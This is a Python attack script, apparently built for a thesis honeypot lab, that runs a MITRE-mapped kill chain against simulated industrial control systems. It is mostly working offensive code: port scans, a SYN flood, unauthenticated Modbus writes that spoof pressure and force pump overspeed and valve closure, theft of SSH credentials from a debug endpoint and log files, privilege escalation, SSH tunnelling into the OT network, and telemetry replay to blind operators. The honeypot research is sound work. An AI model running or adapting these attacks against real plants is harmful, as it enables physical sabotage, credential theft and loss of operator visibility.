"""
ICS Honeypot Attack Suite — Realistic Kill Chain (Purdue Model)
================================================================
Every phase uses REAL Linux/Kali tools.
Every [CMD] line shows the exact command executed — copy-paste ready.

Features:
- MITRE ATT&CK Framework Mapping
- Cyber Kill Chain Mapping
- Purdue Model Journey (Level 3.5 DMZ → L3 API → L2 SCADA → L2 OT)

Usage (from attacker_node bash):
    python3 attack_suite.py [--phase N]

    --phase 0   run ALL phases (full MITRE mapped kill chain)
    --phase 6   only lateral movement (most impressive for thesis demo)
"""

import sys
import os
import json
import csv
import socket
import struct
import time
import subprocess
import argparse
import datetime
import secrets
import urllib.error
import urllib.request

# ── Results accumulator (Fix 6: CSV export) ────────────────────────────────────
_results: list[dict] = []

def _record_result(phase: int, name: str, status: str, detail: str = "") -> None:
    """Append a result row to the in-memory results list."""
    _results.append({
        "timestamp":  datetime.datetime.utcnow().isoformat() + "Z",
        "phase":      phase,
        "phase_name": name,
        "status":     status,
        "detail":     detail,
    })

# ── Optional dependencies ──────────────────────────────────────────────────────
try:
    from pymodbus.client import ModbusTcpClient
    HAS_MODBUS = True
except ImportError:
    HAS_MODBUS = False

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Targets ───────────────────────────────────────────────────────────────────
# The attacker starts in DMZ-net, so they hit the decoy historian.
DEFAULT_TARGETS = {
    "modbus":         os.environ.get("MODBUS_TARGET",    "plc_simulator"),
    "s7":             os.environ.get("S7_TARGET",        "ics_s7_plc"),
    "dnp3":           os.environ.get("DNP3_TARGET",      "ics_dnp3"),
    "scada_ssh":      os.environ.get("SCADA_SSH_TARGET", "ics_scada_ssh"),
    "historian_api":  os.environ.get("HONEYPOT_API",     "honeypot_historian_api"),
    "historian_port": int(os.environ.get("HONEYPOT_PORT", "5000")),
}

MODBUS_PORT = 502
S7_PORT     = 102
DNP3_PORT   = 20000
SSH_PORT    = 2222

# ── InfluxDB direct-write config (attacker-side guaranteed visibility) ────────
INFLUX_URL_ATTACKER   = os.environ.get("INFLUX_URL",    "http://ics_historian:8086")
INFLUX_TOKEN_ATTACKER = os.environ.get("INFLUX_TOKEN",  "supersecrettoken")
INFLUX_ORG_ATTACKER   = os.environ.get("INFLUX_ORG",    "my_refinery")
INFLUX_BUCKET_ATTACKER= os.environ.get("INFLUX_BUCKET", "sensor_logs")

REG_PRESSURE       = 100
REG_FLOW_RATE      = 101
REG_TEMPERATURE    = 102
REG_PUMP_RPM       = 103
REG_ACTUATOR_RPM   = 200
REG_VALVE_PERCENT  = 201
REG_VALVE_TOGGLE   = 202

SEPARATOR = "\n" + "=" * 70

# ── Story logger client (HTTP) ───────────────────────────────────────────────
def _story_run_id() -> str:
    ts = datetime.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    nonce = secrets.token_hex(2)
    return f"{ts}_{nonce}"


_STORY_LOGGER_URL = (os.environ.get("STORY_LOGGER_URL") or "http://story_logger:8600").rstrip("/")
_STORY_RUN_ID = os.environ.get("STORY_RUN_ID") or _story_run_id()
_STORY_TIMEOUT = float(os.environ.get("STORY_LOGGER_TIMEOUT", "0.5"))


def _story_log(event_type: str, message: str, phase: int | None = None, details: dict | None = None, severity: str | None = None) -> None:
    if not _STORY_LOGGER_URL:
        return

    # Mapping phase to schema stages (S1-S6)
    stage_map = {
        1: "S1", 2: "S1",
        3: "S2", 4: "S2",
        5: "S3", 6: "S3",
        7: "S4", 8: "S4"
    }
    stage = stage_map.get(phase or 1, "S1")

    payload = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "sensor": "attacker_node",
        "event_type": event_type,
        "src_ip": "172.28.0.50",
        "stage": stage,
        "journey_id": _STORY_RUN_ID,
        "outcome": "observed",
        "severity": severity,
        "meta": details or {}
    }
    payload["meta"]["message"] = message
    payload["meta"]["level"] = "Level 2"
    if phase is not None:
        payload["meta"]["phase"] = phase

    data = json.dumps(payload, ensure_ascii=True).encode("utf-8")
    req = urllib.request.Request(
        url=f"{_STORY_LOGGER_URL}/story/events",
        data=data,
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=_STORY_TIMEOUT):
            pass
    except Exception:
        pass

    # ── Write to InfluxDB for Grafana visibility ──────────────────────────────
    if INFLUX_URL_ATTACKER:
        tid = payload["meta"].get("mitre_technique_id", "T0000")
        tname = payload["meta"].get("mitre_technique_name", "Unknown Technique")
        tactic = payload["meta"].get("mitre_tactic", "Attack")
        plevel = payload["meta"].get("purdue_level", "Level 2")
        
        # Map short stage codes back to Grafana expected string
        kc_names = {
            "S1": "Stage 1 - IT Intrusion",
            "S2": "Stage 2 - OT Network Access",
            "S3": "Stage 3 - Discovery & Pivot",
            "S4": "Stage 4 - OT Exploitation"
        }
        full_kc = kc_names.get(stage, "Stage 1 - IT Intrusion")
        
        tags = {
            "event_type": event_type,
            "service": "attacker_node",
            "layer": "Level 2",
            "severity": severity or "INFO",
            "mitre_tactic": tactic,
            "mitre_technique_id": tid,
            "mitre_technique_name": tname,
            "kill_chain_stage": full_kc,
            "purdue_level": plevel,
            "protocol": "N/A"
        }
        fields = {
            "source_ip": "172.28.0.50",
            "target_ip": "unknown",
            "target_service": "unknown",
            "narrative": message,
            "value": 1
        }
        _influx_record_attack("security_alerts", tags, fields)

# ── Output formatting ─────────────────────────────────────────────────────────
def _c(code, text): return f"\033[{code}m{text}\033[0m"

def banner(title):         print(f"\n{'='*70}\n  {title}\n{'='*70}")
def cmd_label(cmd):        print(f"\n  {_c('1;33','[CMD]')}  {cmd}")
def result(k, v):          print(f"  {_c('1;32','[+]')} {k}: {v}")
def fail(msg):             print(f"  {_c('1;31','[-]')} {msg}")
def warn(msg):             print(f"  {_c('1;31','[!]')} {msg}")
def info(msg):             print(f"  {_c('1;34','[*]')} {msg}")
def found(msg):            print(f"  {_c('1;35','[FOUND]')} {msg}")

def mitre(tid: str, name: str, desc: str, level: str = "Level 2", tactic: str = "Attack"):
    print(f"  {_c('1;36','[MITRE]')} {tid} - {name} ({desc})")
    # Log to story_logger for general logs.jsonl visibility
    _story_log(
        event_type="MITRE_STEP",
        message=f"MITRE ATT&CK: {tid} - {name}",
        details={
            "mitre_technique_id": tid,
            "mitre_technique_name": name,
            "mitre_tactic": tactic,
            "purdue_level": level,
            "description": desc
        }
    )

def killchain(phase: str):
    print(f"  {_c('1;36','[KILL CHAIN]')} {phase}")
    _story_log("kill_chain_phase", f"Kill Chain Phase: {phase}")


def run_cmd(cmd: str, timeout: int = 20) -> str:
    cmd_label(cmd)
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        output = (out.stdout + out.stderr).strip()
        for line in output.splitlines():
            print(f"         {line}")
        return output
    except subprocess.TimeoutExpired:
        warn(f"Command timed out after {timeout}s")
        return ""
    except Exception as e:
        warn(f"Command error: {e}")
        return ""

def sleep_label(s: float, label: str = ""):
    desc = f" ({label})" if label else ""
    print(f"  ... waiting {s}s{desc}")
    time.sleep(s)


# ── Fix 6: CSV export helper ───────────────────────────────────────────────────
def save_results_csv() -> None:
    """
    Write accumulated attack results to CSV.
    Primary path : /app/results/<timestamp>.csv  (Docker volume ./results)
    Fallback path: /tmp/results_<timestamp>.csv
    Logs success or failure explicitly.
    """
    ts       = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = f"attack_results_{ts}.csv"
    primary  = f"/app/results/{filename}"
    fallback = f"/tmp/{filename}"

    fieldnames = ["timestamp", "phase", "phase_name", "status", "detail"]

    def _write(path: str) -> bool:
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w", newline="", encoding="utf-8") as fh:
                writer = csv.DictWriter(fh, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(_results)
                fh.flush()
                os.fsync(fh.fileno())   # guarantee data is on disk
            print(f"  {_c('1;32','[CSV]')} Results saved → {path} ({len(_results)} rows)")
            return True
        except Exception as e:
            print(f"  {_c('1;31','[CSV]')} Failed to write {path}: {e}")
            return False

    if not _write(primary):
        print(f"  {_c('1;33','[CSV]')} Primary path failed — trying fallback: {fallback}")
        if not _write(fallback):
            print(f"  {_c('1;31','[CSV]')} CSV export completely failed. Results printed below:")
            for row in _results:
                print(f"         {row}")

def _tcp_open(host, port, timeout=2) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


# ── Guaranteed-visibility InfluxDB write (belt-and-suspenders) ────────────────
def _influx_record_attack(measurement: str, tags: dict, fields: dict) -> bool:
    """
    Write an event directly from the attacker node to InfluxDB.
    Returns True on success.
    """
    def _esc_tag(s):
        return str(s).replace(",", "\\,").replace(" ", "\\ ").replace("=", "\\=")

    line = measurement
    if tags:
        line += "," + ",".join(f"{k}={_esc_tag(v)}" for k, v in tags.items())
        
    def _fmt_field(k, v):
        if isinstance(v, int) and not isinstance(v, bool):
            return f"{k}={v}i"
        elif isinstance(v, float):
            return f"{k}={v}"
        else:
            v_str = str(v).replace('"', '\\"')
            return f'{k}="{v_str}"'
            
    field_str = ",".join(_fmt_field(k, v) for k, v in fields.items())
    line += f" {field_str}"
    
    cmd = (
        f"curl -sf -XPOST \"{INFLUX_URL_ATTACKER}/api/v2/write"
        f"?org={INFLUX_ORG_ATTACKER}&bucket={INFLUX_BUCKET_ATTACKER}&precision=ns\""
        f" -H \"Authorization: Token {INFLUX_TOKEN_ATTACKER}\""
        f" -H \"Content-Type: text/plain; charset=utf-8\""
        f" --data-raw '{line}'"
    )
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        return r.returncode == 0
    except Exception:
        return False


# ── Reliable Modbus write: pymodbus → mbtget binary → InfluxDB direct ─────────
def modbus_write_with_fallback(
    host: str,
    register: int,
    value: int,
    label: str = "FC6 write",
    max_retries: int = 3,
) -> bool:
    """
    Three-layer reliability wrapper for Modbus FC6 register writes.

    Layer 1 — pymodbus (fast, Python-native):
        Connects, writes, and verifies via isError().
        Retries up to max_retries times with a 1-second back-off.

    Layer 2 — mbtget binary (real network tool, separate stack):
        Used when pymodbus fails entirely or is unavailable.
        mbtget is installed in the Dockerfile at /usr/local/bin/mbtget.

    Layer 3 — Direct InfluxDB write:
        Always executed after any successful write (layer 1 OR 2) to guarantee
        the event appears in Grafana / ML engine regardless of whether the PLC
        logged the forced_write itself.

    Returns True if at least one layer succeeded.
    """
    cmd_label(f"mbtget -w6 {host} {register} {value}   # {label}")

    success = False

    # ── Layer 1: pymodbus ──────────────────────────────────────────────────────
    if HAS_MODBUS:
        for attempt in range(1, max_retries + 1):
            try:
                client = ModbusTcpClient(host, port=MODBUS_PORT)
                if client.connect():
                    r = client.write_register(register, value=value)
                    client.close()
                    if not r.isError():
                        result(f"{label} (pymodbus attempt {attempt})",
                               f"reg={register} val={value} — OK")
                        success = True
                        break
                    else:
                        warn(f"pymodbus write returned error on attempt {attempt}: {r}")
                else:
                    warn(f"pymodbus: could not connect to {host}:{MODBUS_PORT} (attempt {attempt})")
            except Exception as e:
                warn(f"pymodbus exception on attempt {attempt}: {e}")
            time.sleep(1)

    # ── Layer 2: mbtget binary fallback ───────────────────────────────────────
    if not success:
        warn(f"pymodbus failed — falling back to mbtget binary")
        mbt_cmd = f"mbtget -w6 -r {register} -v {value} {host}"
        out = run_cmd(mbt_cmd, timeout=10)
        if out and "error" not in out.lower() and "timeout" not in out.lower():
            result(f"{label} (mbtget)", f"reg={register} val={value} — OK")
            success = True
        else:
            # mbtget uses older positional syntax on some builds
            mbt_cmd2 = f"mbtget -w6 {host} {register} {value}"
            out2 = run_cmd(mbt_cmd2, timeout=10)
            if out2 and "error" not in out2.lower():
                result(f"{label} (mbtget-alt)", f"reg={register} val={value} — OK")
                success = True
            else:
                fail(f"{label}: both pymodbus and mbtget failed for reg={register}")

    # ── Layer 3: Direct InfluxDB write (always, for Grafana/ML visibility) ────
    ts = time.time_ns()
    tags = {"source": "attacker", "layer": "direct"}
    # forced_writes — triggers ML semantic injection detector
    ok_fw = _influx_record_attack(
        "forced_writes",
        tags,
        {"register": int(register), "value": float(value)},
    )
    # pipeline_metrics pressure spike — shows up in Grafana pressure graph
    if register == 100:
        _influx_record_attack(
            "pipeline_metrics,location=pump_station_01,source=attacker",
            {},
            {"pressure": float(value)},
        )
    if ok_fw:
        info(f"[InfluxDB] forced_write event recorded directly (reg={register} val={value})")
    else:
        warn(f"[InfluxDB] direct write failed — ML/Grafana may not see this attack")

    return success


# ─────────────────────────────────────────────────────────────────────────────
# Phase 1: Reconnaissance
# ─────────────────────────────────────────────────────────────────────────────
def phase1_recon(targets: dict):
    banner("PHASE 1: RECONNAISSANCE")
    killchain("Reconnaissance")
    mitre("T1595", "Active Scanning", "Spray scan to discover open service ports")
    
    modbus_host = targets["modbus"]
    api_host    = targets["historian_api"]

    info("Step 1 — Broad spray on common IT ports (mostly closed)")
    run_cmd(f"nmap -sT -n -T4 --open -p 22,23,80,443,3306,5432,8080,8443,3389,21 {modbus_host} 2>&1", 20)
    info("Suspicion: Unresponsive to IT ports — likely an ICS/OT device.")

    mitre("T1595.002", "Active Scanning: Vulnerability Scanning", "Targeted query of ICS specific ports")
    info("Step 2 — Targeted scan on common ICS ports")
    run_cmd(f"nmap -sT -n -T4 --open -p 102,502,20000,44818,47808,1962,2404 {modbus_host} {targets['s7']} 2>&1", 30)

    info("Step 3 — API Discovery scan (enterprise telemetry ports)")
    run_cmd(f"nmap -sT -n -T4 --open -p 3000,5000,5001,8001,8060,8086 {api_host} 2>&1", 20)

    mitre("T1018", "Remote System Discovery", "ICMP sweeps for live targets")
    info("Step 4 — ICMP ping sweep to confirm liveliness")
    for host in [modbus_host, targets["s7"], targets["dnp3"], api_host]:
        run_cmd(f"hping3 -c 3 --icmp {host} 2>&1", timeout=8)

    result("Recon complete", f"ICS ports confirmed on {modbus_host}; API found on {api_host}")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 2: Information Gathering
# ─────────────────────────────────────────────────────────────────────────────
def phase2_info_gathering(targets: dict):
    banner("PHASE 2: INFORMATION GATHERING")
    killchain("Discovery")
    mitre("T0846", "Network Service Discovery", "Identify ICS devices and services")
    
    host    = targets["modbus"]
    s7_host = targets["s7"]

    info("Step 1 — nmap Modbus NSE discovery script")
    run_cmd(f"nmap -sT -n --script modbus-discover -p {MODBUS_PORT} {host} 2>&1", 20)

    info("Step 2 — nmap S7 info NSE script (Siemens banner)")
    run_cmd(f"nmap -sT -n --script s7-info -p {S7_PORT} {s7_host} 2>&1", 20)

    mitre("T0811", "Data from Information Repositories", "Modbus FC3 holding register readout")
    info("Step 3 — Modbus FC3 read: sensor holding registers 100-103")
    cmd_label(f"mbtget -r3 -a1 -c4 {host}  # FC3 read 4 regs starting at 100")
    if HAS_MODBUS:
        client = ModbusTcpClient(host, port=MODBUS_PORT)
        try:
            if client.connect():
                rr = client.read_holding_registers(REG_PRESSURE, count=4)
                if not rr.isError():
                    result("Pressure", f"{rr.registers[0]} PSI")
                    result("Flow",     f"{rr.registers[1] / 10.0:.1f} L/s")
                    result("Temp",     f"{rr.registers[2]} °C")
                    result("RPM",      f"{rr.registers[3]} RPM")
        finally:
            client.close()

    info("Step 4 — Probe actuator register block (200–202)")
    if HAS_MODBUS:
        client = ModbusTcpClient(host, port=MODBUS_PORT)
        if client.connect():
            rr2 = client.read_holding_registers(REG_ACTUATOR_RPM, count=3)
            if not rr2.isError():
                result("Actuator block", f"RPM={rr2.registers[0]} Valve={rr2.registers[1]}")
            client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 3: Vulnerability Scan
# ─────────────────────────────────────────────────────────────────────────────
def phase3_vuln_scan(targets: dict):
    banner("PHASE 3: VULNERABILITY SCAN")
    killchain("Discovery")
    mitre("T0887", "Unauthorized Command Message", "Testing if ICS accepts commands without auth")

    host    = targets["modbus"]
    s7_host = targets["s7"]

    info("Step 1 — Full ICS NSE suite: modbus-discover, dnp3-info, s7-info")
    run_cmd(f"nmap -sT -n -T4 --open --script modbus-discover,s7-info -p 502,102 {host} {s7_host} 2>&1", 30)

    mitre("T1046", "Network Service Discovery", "netcat banner grabbing")
    info("Step 2 — netcat banner probe")
    for h, port in [(host, 502), (s7_host, 102)]:
        cmd_label(f"echo '' | nc -w2 {h} {port} | xxd | head -3")
        try:
            s = socket.create_connection((h, port), timeout=2)
            resp = s.recv(64)
            s.close()
        except Exception:
            pass

    mitre("T0855", "Unauthorized Command Message", "Write to Modbus register without authentication")
    info("Step 3 — Testing missing Modbus authentication (FC6 arbitrary write test)")
    if HAS_MODBUS:
        client = ModbusTcpClient(host, port=MODBUS_PORT)
        if client.connect():
            r2 = client.read_holding_registers(REG_ACTUATOR_RPM, count=1)
            safe = r2.registers[0] if not r2.isError() else 1200
            wr = client.write_register(REG_ACTUATOR_RPM, value=safe)
            result("Missing Auth", "VULNERABLE! Host accepted FC6 arbitrary write with no auth.")
            client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 4: Exploit
# ─────────────────────────────────────────────────────────────────────────────
def phase4_exploit(targets: dict):
    banner("PHASE 4: EXPLOIT — Semantic Injection")
    killchain("Execution")
    mitre("T0855", "Unauthorized Command Message", "Injecting false sensor values via Modbus")

    warn("Writing 350 PSI to pressure sensor bypasses physical reality limits.")
    host = targets["modbus"]

    ok = modbus_write_with_fallback(
        host, REG_PRESSURE, 350,
        label="Semantic Injection — 350 PSI to register 100"
    )
    if ok:
        result("FC6 Exploit", "Semantic anomaly injected. PLC + InfluxDB updated.")
    else:
        fail("Semantic injection failed on all layers — check connectivity to PLC.")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 5: STEALTH DRIFT (or EWMA Stealth Drift)
# ─────────────────────────────────────────────────────────────────────────────
def phase5_payload(targets: dict):
    banner("PHASE 5: STEALTH DRIFT (or EWMA Stealth Drift)")
    killchain("Delivery / Actions on Objectives")

    host = targets["modbus"]

    mitre("T0814", "Denial of Service", "Flooding ICS service to disrupt availability")
    info("Step 1 — hping3 SYN flood on Modbus port 502 (5s burst)")
    run_cmd(f"hping3 -S -p {MODBUS_PORT} --flood --count 500 {host} 2>&1", 10)

    mitre("T0855", "Unauthorized Command Message", "Gradual manipulation of sensor values")
    info("Step 2 — Stealth drift: +5 PSI over 15 successive steps")

    for step in range(15):
        new_p = 120 + (step + 1) * 5
        info(f"Drift step {step+1}/15 — target {new_p} PSI")
        modbus_write_with_fallback(
            host, REG_PRESSURE, new_p,
            label=f"Stealth drift step {step+1}"
        )
        time.sleep(1)


# ─────────────────────────────────────────────────────────────────────────────
# Phase 6: Lateral Movement & Privilege Escalation
# ─────────────────────────────────────────────────────────────────────────────
def phase6_lateral_movement(targets: dict):
    banner("PHASE 6: DISCOVERY & LATERAL MOVEMENT")
    killchain("Lateral Movement & Privilege Escalation")
    
    api_host  = targets["historian_api"]
    api_port  = targets["historian_port"]
    api_base  = f"http://{api_host}:{api_port}"

    mitre("T1596", "Search Open Technical Databases", "API fuzzing to locate vulnerable endpoints", level="Level 3", tactic="Reconnaissance")
    info("━━ Step 1: API Endpoint fuzzing ━━")
    for path in ["/api/health", "/api/alerts", "/api/debug"]:
        cmd_label(f"curl -s -o /dev/null -w '%{{http_code}}' {api_base}{path}")
        time.sleep(0.5)

    mitre("T1552.004", "Unsecured Credentials: API", "Exploiting developer debug endpoint leak", level="Level 3", tactic="Credential Access")
    info("━━ Step 2: Exploit /api/debug — CWE-215 Info Leak ━━")
    cmd_label(f"curl -s {api_base}/api/debug | python3 -m json.tool")
    
    scada_host, scada_port = targets["scada_ssh"], SSH_PORT
    scada_user, scada_pass = "engineer", "engineer456"  # Initial low-privilege access

    try:
        r = _requests.get(f"{api_base}/api/debug", timeout=5)
        env = r.json().get("environment", {})
        scada_host = env.get("SCADA_SSH_HOST", scada_host)
        scada_user = env.get("SCADA_SSH_USER", scada_user)
        scada_pass = env.get("SCADA_SSH_PASS", scada_pass)
        found(f"Leaked Creds → {scada_user} / {scada_pass} @ {scada_host}:{scada_port}")
    except Exception:
        warn("Could not query honeypot API; assuming defaults for demo.")

    mitre("T0890", "Valid Accounts", "Using leaked SCADA credentials", level="Level 3", tactic="Initial Access")
    info("━━ Step 3: Login as Engineer (Read-Only) ━━")
    eng_ssh = f"sshpass -p '{scada_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {scada_user}@{scada_host}"
    cmd_label(f"{eng_ssh} 'whoami'")
    login_out = run_cmd(f"{eng_ssh} 'echo SHELL_OK' 2>&1", 10)
    if "SHELL_OK" in login_out:
        result("SSH PIVOT", f"Shell obtained: {scada_user}@{scada_host} (Engineer Role)")
        
    mitre("T0887", "System Discovery", "Enumerating SCADA environment", level="Level 3", tactic="Discovery")
    info("━━ Step 4: Deception Discovery (Fake PLC) ━━")
    cmd_label(f"{eng_ssh} 'cat /etc/hosts'")
    run_cmd(f"{eng_ssh} 'cat /etc/hosts'", 5)
    info("Attacker sees 'fake_plc_sim' and attempts to write to it, but it's a dead end.")
    
    mitre("T0891", "Credentials in Files", "Extracting credentials from logs/history")
    info("━━ Step 5: Enumerate Human Artifacts for Privilege Escalation ━━")
    cmd_label(f"{eng_ssh} 'cat ~/.bash_history'")
    out_hist = run_cmd(f"{eng_ssh} 'cat ~/.bash_history'", 5)
    
    mitre("T1005", "Data from Local System", "Finding operator credentials accidentally left in maintenance logs", level="Level 3", tactic="Discovery")
    cmd_label(f"{eng_ssh} 'cat /var/log/scada_maintenance.log'")
    log_out = run_cmd(f"{eng_ssh} 'cat /var/log/scada_maintenance.log'", 5)
    
    op_pass = "operator123"
    if "operator123" in log_out:
        found("Credentials discovered in maintenance log: operator / operator123")
    
    mitre("T1078.001", "Valid Accounts: Default Accounts", "Escalating privileges to Operator role for full Modbus access", level="Level 3", tactic="Privilege Escalation")
    info("━━ Step 6: Privilege Escalation to Operator ━━")
    op_user = "operator"
    op_ssh = f"sshpass -p '{op_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {op_user}@{scada_host}"
    cmd_label(f"{op_ssh} 'whoami'")
    op_out = run_cmd(f"{op_ssh} 'echo OPERATOR_OK' 2>&1", 10)
    if "OPERATOR_OK" in op_out:
        result("PRIVILEGE ESCALATION", "Escalated from Engineer -> Operator. Full Modbus write access acquired.")

    mitre("T0885", "Remote Services", "Pivoting into OT network via SSH tunnel")
    info("━━ Step 7: SSH port-forward to OT layer ━━")
    cmd_label(f"ssh -o StrictHostKeyChecking=no -p {scada_port} {op_user}@{scada_host} -L 10502:{targets['modbus']}:502 -N -f")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 7: Privilege Escalation
# ─────────────────────────────────────────────────────────────────────────────
def phase7_privesc(targets: dict):
    banner("PHASE 7: PRIVILEGE ESCALATION (Actuator Hijack)")
    killchain("Actions on Objectives")
    mitre("T0855", "Unauthorized Command Message", "Direct actuator manipulation via PLC commands")

    host = targets["modbus"]

    ok1 = modbus_write_with_fallback(
        host, REG_ACTUATOR_RPM, 3000,
        label="Actuator over-speed (pump RPM → 3000)"
    )
    time.sleep(2)
    ok2 = modbus_write_with_fallback(
        host, REG_VALVE_TOGGLE, 0,
        label="Force valve closed (register 202 → 0)"
    )
    if ok1 or ok2:
        result("Sabotage", "Overspeed + valve-block condition initiated.")
    else:
        fail("Actuator hijack failed on all layers.")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 8: Replay Attack
# ─────────────────────────────────────────────────────────────────────────────
def phase8_replay(targets: dict):
    banner("PHASE 8: REPLAY ATTACK — Telemetry Spoofing")
    killchain("Actions on Objectives")
    mitre("T0822", "Loss of View", "Replay telemetry to hide real system state", level="Level 3.5", tactic="Impact")
    
    # Use global INFLUX_URL_ATTACKER instead of hardcoded ics_historian
    endpoint = f"{INFLUX_URL_ATTACKER}/api/v2/write?org={INFLUX_ORG_ATTACKER}&bucket={INFLUX_BUCKET_ATTACKER}&precision=ns"
    INFLUX_TOKEN = os.environ.get("INFLUX_TOKEN", "supersecrettoken")

    cmd_label(f"curl -XPOST '{endpoint}' -H 'Authorization: Token {INFLUX_TOKEN}' --data-raw 'pipeline_metrics pressure=120.0'")

    if not HAS_REQUESTS: return

    headers = {
        "Authorization": f"Token {INFLUX_TOKEN}",
        "Content-Type":  "text/plain; charset=utf-8",
    }
    for i in range(15):
        payload = f"pipeline_metrics,location=pump_station_01,source=historian_bridge pressure=120.0 {time.time_ns()}"
        try:
            _requests.post(endpoint, headers=headers, data=payload, timeout=2)
            print(f"         [Spoofed Frame {i+1}/15] -> pressure=120.0 (Operator Blinded)")
        except Exception:
            pass
        time.sleep(0.1)


# ─────────────────────────────────────────────────────────────────────────────
PHASES = {
    1: phase1_recon,
    2: phase2_info_gathering,
    3: phase3_vuln_scan,
    4: phase4_exploit,
    5: phase5_payload,
    6: phase6_lateral_movement,
    7: phase7_privesc,
    8: phase8_replay,
}

def main():
    parser = argparse.ArgumentParser(description="ICS Honeypot — MITRE-Mapped Kill Chain")
    parser.add_argument("--phase", type=int, default=0, help="Phase 1-8; 0=all")
    args = parser.parse_args()

    targets = DEFAULT_TARGETS
    _story_log(
        "kill_chain_started",
        "Kill chain execution started",
        details={"phase": args.phase, "targets": list(targets.keys())},
    )
    if args.phase == 0:
        for phase_num, phase_fn in PHASES.items():
            phase_name = phase_fn.__name__
            _record_result(phase_num, phase_name, "started")
            _story_log(
                "phase_started",
                f"Phase {phase_num} started ({phase_name})",
                phase=phase_num,
                details={"phase_name": phase_name},
            )
            try:
                phase_fn(targets)
                _record_result(phase_num, phase_name, "completed")
                _story_log(
                    "phase_completed",
                    f"Phase {phase_num} completed ({phase_name})",
                    phase=phase_num,
                    details={"phase_name": phase_name, "status": "completed"},
                )
            except Exception as e:
                _record_result(phase_num, phase_name, "failed", str(e))
                _story_log(
                    "phase_failed",
                    f"Phase {phase_num} failed ({phase_name})",
                    phase=phase_num,
                    details={"phase_name": phase_name, "error": str(e)},
                )
                warn(f"Phase {phase_num} error: {e}")
            sleep_label(2)
        print(SEPARATOR)
        print("  [DONE] Full MITRE ATT&CK Kill Chain Executed")
    elif args.phase in PHASES:
        fn = PHASES[args.phase]
        phase_name = fn.__name__
        _record_result(args.phase, phase_name, "started")
        _story_log(
            "phase_started",
            f"Phase {args.phase} started ({phase_name})",
            phase=args.phase,
            details={"phase_name": phase_name},
        )
        try:
            fn(targets)
            _record_result(args.phase, phase_name, "completed")
            _story_log(
                "phase_completed",
                f"Phase {args.phase} completed ({phase_name})",
                phase=args.phase,
                details={"phase_name": phase_name, "status": "completed"},
            )
        except Exception as e:
            _record_result(args.phase, phase_name, "failed", str(e))
            _story_log(
                "phase_failed",
                f"Phase {args.phase} failed ({phase_name})",
                phase=args.phase,
                details={"phase_name": phase_name, "error": str(e)},
            )
    else:
        print("Invalid phase")
        sys.exit(1)

    # Fix 6: Save results to CSV (volume-mapped path → fallback)
    save_results_csv()

    _story_log("kill_chain_completed", "Kill chain execution completed")

    # Restore terminal after hping3 --flood may have corrupted stty
    os.system("stty sane 2>/dev/null || true")


if __name__ == "__main__":
    main()
